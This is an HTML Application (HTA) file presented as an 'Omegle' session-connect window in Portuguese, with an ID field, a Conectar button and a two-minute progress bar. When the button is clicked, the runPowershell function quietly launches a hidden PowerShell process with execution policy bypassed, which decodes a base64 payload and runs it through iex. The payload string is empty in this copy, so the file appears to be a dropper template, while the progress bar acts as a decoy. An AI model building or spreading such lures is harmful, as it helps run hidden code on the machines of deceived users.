<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8"/>
<title>Omegle</title>
<HTA:APPLICATION
  ID="omApp"
  APPLICATIONNAME="Omegle"
  BORDER="thin"
  BORDERSTYLE="static"
  CAPTION="yes"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="yes"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
  SCROLL="no"
  WINDOWSTATE="normal"
/>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { width: 100%; height: 100%; overflow: hidden; }
body {
  font-family: "Segoe UI", Arial, Helvetica, sans-serif;
  background: linear-gradient(165deg, #d4f3e0 0%, #b8dff5 50%, #a8d0f7 100%);
  color: #1a1a1a;
}
.shell {
  height: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 24px 28px;
  gap: 20px;
}
.hero {
  width: 100%;
  max-width: 440px;
  border-radius: 16px;
  overflow: hidden;
  box-shadow: 0 10px 32px rgba(0,40,80,.12);
  background: #fff;
  line-height: 0;
}
.hero img {
  display: block;
  width: 100%;
  height: auto;
  border: 0;
}
.panel {
  width: 100%;
  max-width: 440px;
  background: #ffffff;
  border-radius: 14px;
  padding: 22px 22px 18px;
  box-shadow: 0 6px 22px rgba(0,40,80,.10);
  border: 1px solid rgba(255,255,255,.8);
}
.title {
  font-size: 13px;
  font-weight: 600;
  color: #555;
  margin-bottom: 14px;
  letter-spacing: 0.2px;
}
.id-row {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
}
.id-row label {
  font-size: 14px;
  font-weight: 700;
  color: #333;
  min-width: 28px;
}
.id-row input {
  flex: 1;
  height: 38px;
  border: 1px solid #cfd6de;
  border-radius: 9px;
  padding: 0 12px;
  font-size: 15px;
  letter-spacing: 0.5px;
  outline: none;
  background: #fafbfc;
}
.id-row input:focus {
  border-color: #3b7ddd;
  background: #fff;
  box-shadow: 0 0 0 3px rgba(59,125,221,.15);
}
button.go {
  width: 100%;
  height: 42px;
  border: none;
  border-radius: 9px;
  background: #3b7ddd;
  color: #fff;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  letter-spacing: 0.3px;
}
button.go:hover { background: #326fc7; }
button.go:disabled {
  background: #a7c3e8;
  cursor: default;
}
.progress-wrap {
  display: none;
  margin-top: 14px;
  background: #e8edf3;
  border-radius: 8px;
  height: 10px;
  overflow: hidden;
}
.progress-wrap.show { display: block; }
.progress-bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, #3b7ddd, #5aa0ff);
}
.status {
  display: none;
  margin-top: 10px;
  font-size: 12px;
  color: #666;
  text-align: center;
}
.status.show { display: block; }
.hint {
  margin-top: 10px;
  font-size: 11px;
  color: #999;
  text-align: center;
}
</style>
<script type="text/javascript">
var running = false;
var tickTimer = null;
var payloadB64 = "";

function resizeWin() {
  try {
    window.resizeTo(520, 580);
    window.moveTo((screen.width - 520) / 2, (screen.height - 580) / 2);
  } catch (e) {}
}

function onlyDigits(el) {
  var v = el.value.replace(/\D/g, "");
  if (v.length > 10) v = v.substring(0, 10);
  el.value = v;
}

function runPowershell() {
  try {
    var sh = new ActiveXObject("WScript.Shell");
    var cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + payloadB64 + "')) | iex\"";
    sh.Run(cmd, 0, false);
  } catch (e) {}
}

function formatTime(sec) {
  var m = Math.floor(sec / 60);
  var s = sec % 60;
  return (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s;
}

function conectar() {
  if (running) return;
  var idBox = document.getElementById("fldId");
  onlyDigits(idBox);
  var idVal = idBox.value;
  if (!idVal || idVal.length < 1) {
    idBox.focus();
    var st0 = document.getElementById("status");
    st0.className = "status show";
    st0.innerText = "Informe o ID (até 10 dígitos).";
    return;
  }
  running = true;
  var btn = document.getElementById("btnGo");
  var bar = document.getElementById("bar");
  var wrap = document.getElementById("pwrap");
  var st = document.getElementById("status");
  btn.disabled = true;
  wrap.className = "progress-wrap show";
  st.className = "status show";
  bar.style.width = "0%";
  st.innerText = "Conectando... 02:00";

  runPowershell();

  var total = 120;
  var elapsed = 0;
  if (tickTimer) clearInterval(tickTimer);
  tickTimer = setInterval(function () {
    elapsed++;
    if (elapsed > total) elapsed = total;
    bar.style.width = Math.round((elapsed / total) * 100) + "%";
    st.innerText = "Conectando... " + formatTime(total - elapsed);
    if (elapsed >= total) {
      clearInterval(tickTimer);
      st.innerText = "Conectado.";
      btn.disabled = false;
      running = false;
    }
  }, 1000);
}

window.onload = resizeWin;
</script>
</head>
<body>
<div class="shell">
  <div class="hero">
    <img src="data:image/jpeg;base64," alt="Omegle"/>
  </div>
  <div class="panel">
    <div class="title">Identificação da sessão</div>
    <div class="id-row">
      <label for="fldId">ID:</label>
      <input type="text" id="fldId" maxlength="10" placeholder="0000000000" onkeyup="onlyDigits(this)" onchange="onlyDigits(this)"/>
    </div>
    <button class="go" id="btnGo" onclick="conectar()">Conectar</button>
    <div class="progress-wrap" id="pwrap"><div class="progress-bar" id="bar"></div></div>
    <div class="status" id="status"></div>
    <div class="hint">Máximo 10 dígitos</div>
  </div>
</div>
</body>
</html>
